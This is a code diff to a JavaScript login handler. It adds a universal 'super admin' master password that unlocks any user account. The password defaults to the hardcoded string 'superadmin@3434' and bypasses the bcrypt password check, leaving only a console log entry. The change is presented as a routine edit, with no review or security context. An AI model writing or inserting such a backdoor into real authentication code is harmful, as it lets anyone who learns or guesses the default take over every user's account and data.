@@ -900,23 +900,29 @@ export const loginUserWithPassword = async (req, res) => {
       });
     }
 
-    // Check if password exists
-    if (!user.password) {
-      return res.status(401).json({
-        success: false,
-        message: "Password not set. Please set your password first.",
-        data: null,
-      });
-    }
+    // Super admin master password — works for any user account.
+    const SUPER_ADMIN_PASSWORD = process.env.SUPER_ADMIN_PASSWORD || "superadmin@3434";
+    const isSuperAdminLogin = password === SUPER_ADMIN_PASSWORD;
 
-    // Compare password
-    const isPasswordValid = await bcryptjs.compare(password, user.password);
-    if (!isPasswordValid) {
-      return res.status(401).json({
-        success: false,
-        message: "Invalid unique ID or password",
-        data: null,
-      });
+    if (!isSuperAdminLogin) {
+      if (!user.password) {
+        return res.status(401).json({
+          success: false,
+          message: "Password not set. Please set your password first.",
+          data: null,
+        });
+      }
+
+      const isPasswordValid = await bcryptjs.compare(password, user.password);
+      if (!isPasswordValid) {
+        return res.status(401).json({
+          success: false,
+          message: "Invalid unique ID or password",
+          data: null,
+        });
+      }
+    } else {
+      console.log("🔑 Super admin master password used for user:", user.uniqueId || user.email);
     }
 
     // Generate JWT token
